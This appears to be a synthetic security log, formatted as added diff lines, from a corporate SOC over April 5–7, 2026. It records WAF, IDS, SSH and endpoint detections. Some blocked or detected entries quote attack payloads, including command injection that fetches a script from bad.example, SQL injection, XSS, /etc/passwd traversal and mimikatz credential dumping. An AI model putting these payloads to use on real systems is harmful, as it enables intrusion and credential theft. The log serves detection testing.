+2026-04-05T13:36:00 WARNING web-gw: suspicious request src=203.0.113.158 path=/app/search?q=1=1 blocked=soft
+2026-04-05T13:48:00 INFO mailgw: message_id=<M-0549@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-05T14:00:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.160 current_rate=70/s threshold=200/s
+2026-04-05T14:12:00 NOTICE backup: incremental snapshot completed server=soc-sql-0551 duration_s=71
+2026-04-05T14:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0552.bin size=72
+2026-04-05T14:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=73
+2026-04-05T14:48:00 WARNING sshd: Failed password for admin from 203.0.113.164 port 74 ssh2
+2026-04-05T15:00:00 INFO auth: successful login for analyst from 203.0.113.165 mfa=pass session=s-0555
+2026-04-05T15:12:00 INFO app: routine health check passed host=node-0556 latency_ms=76 status=ok
+2026-04-05T15:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0557.bin size=77
+2026-04-05T15:36:00 WARNING sshd: Failed password for admin from 203.0.113.168 port 78 ssh2
+2026-04-05T15:48:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.169
+2026-04-05T16:00:00 INFO dashboard: /api/summary request served src=203.0.113.170 response_ms=80
+2026-04-05T16:12:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.171
+2026-04-05T16:24:00 INFO dashboard: /api/summary request served src=203.0.113.172 response_ms=82
+2026-04-05T16:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0563 duration_s=83
+2026-04-05T16:48:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.174 payload="union select ...; bash -c curl bad.example"
+2026-04-05T17:00:00 INFO auth: successful login for analyst from 203.0.113.175 mfa=pass session=s-0565
+2026-04-05T17:12:00 INFO dashboard: /api/summary request served src=203.0.113.176 response_ms=86
+2026-04-05T17:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0567.bin size=87
+2026-04-05T17:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.178
+2026-04-05T17:48:00 INFO dashboard: /api/summary request served src=203.0.113.179 response_ms=89
+2026-04-05T18:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0570.bin size=90
+2026-04-05T18:12:00 INFO app: routine health check passed host=node-0571 latency_ms=91 status=ok
+2026-04-05T18:24:00 INFO app: routine health check passed host=node-0572 latency_ms=92 status=ok
+2026-04-05T18:36:00 INFO app: routine health check passed host=node-0573 latency_ms=93 status=ok
+2026-04-05T18:48:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.184 current_rate=94/s threshold=200/s
+2026-04-05T19:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0575 duration_s=95
+2026-04-05T19:12:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0576 src=203.0.113.186
+2026-04-05T19:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0577.bin size=97
+2026-04-05T19:36:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.188 campaign=camp-0578
+2026-04-05T19:48:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0579
+2026-04-05T20:00:00 EMERGENCY soc: Failed password for root from 203.0.113.190; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0580
+2026-04-05T20:12:00 INFO dashboard: /api/summary request served src=203.0.113.191 response_ms=101
+2026-04-05T20:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=102
+2026-04-05T20:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=103
+2026-04-05T20:48:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.194 current_rate=104/s threshold=200/s
+2026-04-05T21:00:00 INFO dashboard: /api/summary request served src=203.0.113.195 response_ms=105
+2026-04-05T21:12:00 INFO mailgw: message_id=<M-0586@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-05T21:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0587.bin size=107
+2026-04-05T21:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.198
+2026-04-05T21:48:00 HIGH soc: DDoS amplification flood detected src=203.0.113.199 pps=109
+2026-04-05T22:00:00 WARNING sshd: Failed password for admin from 203.0.113.200 port 110 ssh2
+2026-04-05T22:12:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.201 against 10.20.0591.0/24
+2026-04-05T22:24:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.202 payload="union select ...; bash -c curl bad.example"
+2026-04-05T22:36:00 WARNING web-gw: suspicious request src=203.0.113.203 path=/app/search?q=1=1 blocked=soft
+2026-04-05T22:48:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.204 payload="union select ...; bash -c curl bad.example"
+2026-04-05T23:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0595.bin size=115
+2026-04-05T23:12:00 INFO dashboard: /api/summary request served src=203.0.113.206 response_ms=116
+2026-04-05T23:24:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0597 source=203.0.113.207 pass-the-hash attempt=true
+2026-04-05T23:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=118
+2026-04-05T23:48:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.209
+2026-04-06T00:00:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0600@example-mail.net
+2026-04-06T00:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=121
+2026-04-06T00:24:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0602
+2026-04-06T00:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=123
+2026-04-06T00:48:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.14
+2026-04-06T01:00:00 WARNING sshd: Failed password for admin from 203.0.113.15 port 125 ssh2
+2026-04-06T01:12:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0606@example-mail.net
+2026-04-06T01:24:00 INFO mailgw: message_id=<M-0607@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-06T01:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0608.bin size=128
+2026-04-06T01:48:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.19 current_rate=129/s threshold=200/s
+2026-04-06T02:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0610.bin size=130
+2026-04-06T02:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0611.bin size=131
+2026-04-06T02:24:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.22
+2026-04-06T02:36:00 INFO dashboard: /api/summary request served src=203.0.113.23 response_ms=133
+2026-04-06T02:48:00 INFO mailgw: message_id=<M-0614@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-06T03:00:00 INFO dashboard: /api/summary request served src=203.0.113.25 response_ms=135
+2026-04-06T03:12:00 WARNING web-gw: suspicious request src=203.0.113.26 path=/app/search?q=1=1 blocked=soft
+2026-04-06T03:24:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.27
+2026-04-06T03:36:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.28 payload="union select ...; bash -c curl bad.example"
+2026-04-06T03:48:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.29
+2026-04-06T04:00:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0620 source=203.0.113.30 pass-the-hash attempt=true
+2026-04-06T04:12:00 NOTICE backup: incremental snapshot completed server=soc-sql-0621 duration_s=141
+2026-04-06T04:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0622.bin size=142
+2026-04-06T04:36:00 WARNING sshd: Failed password for admin from 203.0.113.33 port 143 ssh2
+2026-04-06T04:48:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0624 src=203.0.113.34
+2026-04-06T05:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=145
+2026-04-06T05:12:00 INFO mailgw: message_id=<M-0626@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-06T05:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0627.bin size=147
+2026-04-06T05:36:00 EMERGENCY soc: Failed password for root from 203.0.113.38; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0628
+2026-04-06T05:48:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.39 current_rate=149/s threshold=200/s
+2026-04-06T06:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=150
+2026-04-06T06:12:00 INFO mailgw: message_id=<M-0631@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-06T06:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0632.bin size=152
+2026-04-06T06:36:00 INFO mailgw: message_id=<M-0633@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-06T06:48:00 INFO auth: successful login for analyst from 203.0.113.44 mfa=pass session=s-0634
+2026-04-06T07:00:00 INFO dashboard: /api/summary request served src=203.0.113.45 response_ms=155
+2026-04-06T07:12:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.46 current_rate=156/s threshold=200/s
+2026-04-06T07:24:00 EMERGENCY soc: Failed password for root from 203.0.113.47; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0637
+2026-04-06T07:36:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.48
+2026-04-06T07:48:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.49
+2026-04-06T08:00:00 HIGH soc: DDoS amplification flood detected src=203.0.113.50 pps=160
+2026-04-06T08:12:00 INFO auth: successful login for analyst from 203.0.113.51 mfa=pass session=s-0641
+2026-04-06T08:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0642 duration_s=162
+2026-04-06T08:36:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.53
+2026-04-06T08:48:00 INFO mailgw: message_id=<M-0644@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-06T09:00:00 INFO mailgw: message_id=<M-0645@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-06T09:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0646.bin size=166
+2026-04-06T09:24:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.57
+2026-04-06T09:36:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0648 source=203.0.113.58 pass-the-hash attempt=true
+2026-04-06T09:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=169
+2026-04-06T10:00:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.60 campaign=camp-0650
+2026-04-06T10:12:00 EMERGENCY soc: Failed password for root from 203.0.113.61; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0651
+2026-04-06T10:24:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.62
+2026-04-06T10:36:00 INFO dashboard: /api/summary request served src=203.0.113.63 response_ms=173
+2026-04-06T10:48:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.64 against 10.20.0654.0/24
+2026-04-06T11:00:00 INFO auth: successful login for analyst from 203.0.113.65 mfa=pass session=s-0655
+2026-04-06T11:12:00 WARNING web-gw: suspicious request src=203.0.113.66 path=/app/search?q=1=1 blocked=soft
+2026-04-06T11:24:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.67
+2026-04-06T11:36:00 INFO dashboard: /api/summary request served src=203.0.113.68 response_ms=178
+2026-04-06T11:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=179
+2026-04-06T12:00:00 INFO dashboard: /api/summary request served src=203.0.113.70 response_ms=180
+2026-04-06T12:12:00 EMERGENCY soc: Failed password for root from 203.0.113.71; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0661
+2026-04-06T12:24:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0662 src=203.0.113.72
+2026-04-06T12:36:00 INFO dashboard: /api/summary request served src=203.0.113.73 response_ms=183
+2026-04-06T12:48:00 INFO mailgw: message_id=<M-0664@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-06T13:00:00 INFO auth: successful login for analyst from 203.0.113.75 mfa=pass session=s-0665
+2026-04-06T13:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0666.bin size=186
+2026-04-06T13:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0667 duration_s=187
+2026-04-06T13:36:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.78
+2026-04-06T13:48:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.79
+2026-04-06T14:00:00 INFO auth: successful login for analyst from 203.0.113.80 mfa=pass session=s-0670
+2026-04-06T14:12:00 WARNING sshd: Failed password for admin from 203.0.113.81 port 191 ssh2
+2026-04-06T14:24:00 INFO dashboard: /api/summary request served src=203.0.113.82 response_ms=192
+2026-04-06T14:36:00 HIGH soc: DDoS amplification flood detected src=203.0.113.83 pps=193
+2026-04-06T14:48:00 INFO auth: successful login for analyst from 203.0.113.84 mfa=pass session=s-0674
+2026-04-06T15:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0675.bin size=195
+2026-04-06T15:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=196
+2026-04-06T15:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=197
+2026-04-06T15:36:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0678 source=203.0.113.88 pass-the-hash attempt=true
+2026-04-06T15:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0679 duration_s=199
+2026-04-06T16:00:00 INFO dashboard: /api/summary request served src=203.0.113.90 response_ms=200
+2026-04-06T16:12:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0681 src=203.0.113.91
+2026-04-06T16:24:00 HIGH soc: DDoS amplification flood detected src=203.0.113.92 pps=202
+2026-04-06T16:36:00 EMERGENCY soc: Failed password for root from 203.0.113.93; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0683
+2026-04-06T16:48:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.94
+2026-04-06T17:00:00 INFO auth: successful login for analyst from 203.0.113.95 mfa=pass session=s-0685
+2026-04-06T17:12:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.96 current_rate=206/s threshold=200/s
+2026-04-06T17:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0687.bin size=207
+2026-04-06T17:36:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.98 payload="union select ...; bash -c curl bad.example"
+2026-04-06T17:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=209
+2026-04-06T18:00:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.100 campaign=camp-0690
+2026-04-06T18:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=211
+2026-04-06T18:24:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.102
+2026-04-06T18:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=213
+2026-04-06T18:48:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.104
+2026-04-06T19:00:00 INFO auth: successful login for analyst from 203.0.113.105 mfa=pass session=s-0695
+2026-04-06T19:12:00 INFO auth: successful login for analyst from 203.0.113.106 mfa=pass session=s-0696
+2026-04-06T19:24:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0697@example-mail.net
+2026-04-06T19:36:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.108
+2026-04-06T19:48:00 INFO mailgw: message_id=<M-0699@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-06T20:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=220
+2026-04-06T20:12:00 INFO app: routine health check passed host=node-0701 latency_ms=221 status=ok
+2026-04-06T20:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=222
+2026-04-06T20:36:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0703@example-mail.net
+2026-04-06T20:48:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.114 payload="union select ...; bash -c curl bad.example"
+2026-04-06T21:00:00 INFO dashboard: /api/summary request served src=203.0.113.115 response_ms=225
+2026-04-06T21:12:00 INFO app: routine health check passed host=node-0706 latency_ms=226 status=ok
+2026-04-06T21:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0707.bin size=227
+2026-04-06T21:36:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.118 campaign=camp-0708
+2026-04-06T21:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=229
+2026-04-06T22:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=230
+2026-04-06T22:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=231
+2026-04-06T22:24:00 INFO auth: successful login for analyst from 203.0.113.122 mfa=pass session=s-0712
+2026-04-06T22:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0713.bin size=233
+2026-04-06T22:48:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0714@example-mail.net
+2026-04-06T23:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0715 duration_s=235
+2026-04-06T23:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0716.bin size=236
+2026-04-06T23:24:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.127 current_rate=237/s threshold=200/s
+2026-04-06T23:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0718 duration_s=238
+2026-04-06T23:48:00 INFO dashboard: /api/summary request served src=203.0.113.129 response_ms=239
+2026-04-07T00:00:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.130
+2026-04-07T00:12:00 WARNING sshd: Failed password for admin from 203.0.113.131 port 241 ssh2
+2026-04-07T00:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0722.bin size=242
+2026-04-07T00:36:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.133 current_rate=243/s threshold=200/s
+2026-04-07T00:48:00 INFO dashboard: /api/summary request served src=203.0.113.134 response_ms=244
+2026-04-07T01:00:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.135
+2026-04-07T01:12:00 INFO auth: successful login for analyst from 203.0.113.136 mfa=pass session=s-0726
+2026-04-07T01:24:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.137
+2026-04-07T01:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.138
+2026-04-07T01:48:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.139
+2026-04-07T02:00:00 HIGH soc: DDoS amplification flood detected src=203.0.113.140 pps=250
+2026-04-07T02:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=251
+2026-04-07T02:24:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.142 campaign=camp-0732
+2026-04-07T02:36:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.143
+2026-04-07T02:48:00 WARNING web-gw: suspicious request src=203.0.113.144 path=/app/search?q=1=1 blocked=soft
+2026-04-07T03:00:00 INFO dashboard: /api/summary request served src=203.0.113.145 response_ms=255
+2026-04-07T03:12:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.146
+2026-04-07T03:24:00 HIGH soc: DDoS amplification flood detected src=203.0.113.147 pps=257
+2026-04-07T03:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0738.bin size=258
+2026-04-07T03:48:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.149 against 10.20.0739.0/24
+2026-04-07T04:00:00 INFO dashboard: /api/summary request served src=203.0.113.150 response_ms=260
+2026-04-07T04:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0741.bin size=261
+2026-04-07T04:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0742 duration_s=262
+2026-04-07T04:36:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0743@example-mail.net
+2026-04-07T04:48:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0744@example-mail.net
+2026-04-07T05:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0745.bin size=265
+2026-04-07T05:12:00 EMERGENCY soc: Failed password for root from 203.0.113.156; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0746
+2026-04-07T05:24:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.157
+2026-04-07T05:36:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.158 against 10.20.0748.0/24
+2026-04-07T05:48:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.159 payload="union select ...; bash -c curl bad.example"
+2026-04-07T06:00:00 INFO auth: successful login for analyst from 203.0.113.160 mfa=pass session=s-0750
+2026-04-07T06:12:00 NOTICE backup: incremental snapshot completed server=soc-sql-0751 duration_s=271
+2026-04-07T06:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=272
+2026-04-07T06:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0753.bin size=273
+2026-04-07T06:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0754.bin size=274
+2026-04-07T07:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=275
+2026-04-07T07:12:00 WARNING sshd: Failed password for admin from 203.0.113.166 port 276 ssh2
+2026-04-07T07:24:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0757
+2026-04-07T07:36:00 WARNING sshd: Failed password for admin from 203.0.113.168 port 278 ssh2
+2026-04-07T07:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0759.bin size=279
+2026-04-07T08:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0760 duration_s=280
+2026-04-07T08:12:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0761@example-mail.net
+2026-04-07T08:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0762.bin size=282
+2026-04-07T08:36:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.173 current_rate=283/s threshold=200/s
+2026-04-07T08:48:00 INFO mailgw: message_id=<M-0764@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T09:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=285
+2026-04-07T09:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0766.bin size=286
+2026-04-07T09:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0767.bin size=287
+2026-04-07T09:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0768.bin size=288
+2026-04-07T09:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=289
+2026-04-07T10:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=290
+2026-04-07T10:12:00 WARNING web-gw: suspicious request src=203.0.113.181 path=/app/search?q=1=1 blocked=soft
+2026-04-07T10:24:00 HIGH soc: DDoS amplification flood detected src=203.0.113.182 pps=292
+2026-04-07T10:36:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0773 src=203.0.113.183
+2026-04-07T10:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0774 duration_s=294
+2026-04-07T11:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0775 duration_s=295
+2026-04-07T11:12:00 WARNING sshd: Failed password for admin from 203.0.113.186 port 296 ssh2
+2026-04-07T11:24:00 EMERGENCY soc: Failed password for root from 203.0.113.187; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0777
+2026-04-07T11:36:00 EMERGENCY soc: Failed password for root from 203.0.113.188; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0778
+2026-04-07T11:48:00 INFO dashboard: /api/summary request served src=203.0.113.189 response_ms=299
+2026-04-07T12:00:00 INFO app: routine health check passed host=node-0780 latency_ms=300 status=ok
+2026-04-07T12:12:00 INFO app: routine health check passed host=node-0781 latency_ms=301 status=ok
+2026-04-07T12:24:00 INFO auth: successful login for analyst from 203.0.113.192 mfa=pass session=s-0782
+2026-04-07T12:36:00 INFO mailgw: message_id=<M-0783@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T12:48:00 INFO mailgw: message_id=<M-0784@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T13:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=305
+2026-04-07T13:12:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.196 current_rate=306/s threshold=200/s
+2026-04-07T13:24:00 INFO dashboard: /api/summary request served src=203.0.113.197 response_ms=307
+2026-04-07T13:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0788.bin size=308
+2026-04-07T13:48:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.199
+2026-04-07T14:00:00 INFO auth: successful login for analyst from 203.0.113.200 mfa=pass session=s-0790
+2026-04-07T14:12:00 INFO auth: successful login for analyst from 203.0.113.201 mfa=pass session=s-0791
+2026-04-07T14:24:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.202
+2026-04-07T14:36:00 INFO auth: successful login for analyst from 203.0.113.203 mfa=pass session=s-0793
+2026-04-07T14:48:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.204
+2026-04-07T15:00:00 INFO auth: successful login for analyst from 203.0.113.205 mfa=pass session=s-0795
+2026-04-07T15:12:00 INFO dashboard: /api/summary request served src=203.0.113.206 response_ms=316
+2026-04-07T15:24:00 INFO mailgw: message_id=<M-0797@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T15:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0798 duration_s=318
+2026-04-07T15:48:00 INFO auth: successful login for analyst from 203.0.113.209 mfa=pass session=s-0799
+2026-04-07T16:00:00 INFO app: routine health check passed host=node-0800 latency_ms=320 status=ok
+2026-04-07T16:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=321
+2026-04-07T16:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0802 duration_s=322
+2026-04-07T16:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0803 duration_s=323
+2026-04-07T16:48:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.14
+2026-04-07T17:00:00 INFO auth: successful login for analyst from 203.0.113.15 mfa=pass session=s-0805
+2026-04-07T17:12:00 INFO app: routine health check passed host=node-0806 latency_ms=326 status=ok
+2026-04-07T17:24:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.17
+2026-04-07T17:36:00 EMERGENCY soc: Failed password for root from 203.0.113.18; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0808
+2026-04-07T17:48:00 INFO auth: successful login for analyst from 203.0.113.19 mfa=pass session=s-0809
+2026-04-07T18:00:00 INFO auth: successful login for analyst from 203.0.113.20 mfa=pass session=s-0810
+2026-04-07T18:12:00 INFO dashboard: /api/summary request served src=203.0.113.21 response_ms=331
+2026-04-07T18:24:00 INFO mailgw: message_id=<M-0812@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T18:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0813.bin size=333
+2026-04-07T18:48:00 INFO mailgw: message_id=<M-0814@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T19:00:00 INFO dashboard: /api/summary request served src=203.0.113.25 response_ms=335
+2026-04-07T19:12:00 NOTICE backup: incremental snapshot completed server=soc-sql-0816 duration_s=336
+2026-04-07T19:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0817 duration_s=337
+2026-04-07T19:36:00 INFO mailgw: message_id=<M-0818@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T19:48:00 INFO mailgw: message_id=<M-0819@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T20:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=340
